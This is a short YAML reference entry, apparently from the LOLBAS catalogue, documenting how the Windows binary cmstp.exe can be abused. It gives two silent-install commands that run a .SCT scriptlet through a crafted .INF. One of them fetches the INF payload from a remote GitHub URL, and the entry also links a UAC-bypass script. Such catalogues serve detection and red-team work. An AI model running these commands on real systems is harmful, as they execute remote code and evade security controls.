---
name: cmstp.exe
description: Installs or removes a Connection Manager service profile. Used without optional parameters, cmstp installs a service profile with default settings appropriate to the operating system and to the user's permissions.
functions:
  execute:
    - description: Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
      code: cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
    - description: Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.
      code: cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
resources: 
    - resource: https://twitter.com/NickTyrer/status/958450014111633408
    - resource: https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80
    - resource: https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e
    - resource: https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
    - resource: https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1
    - resource: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmstp
fullpath: 
    - path: c:\windows\system32\cmstp.exe
    - path: c:\windows\sysWOW64\cmstp.exe
notes: Thanks to Oddvar Moe - @oddvarmoe, Nick Tyrer - @NickTyrer
---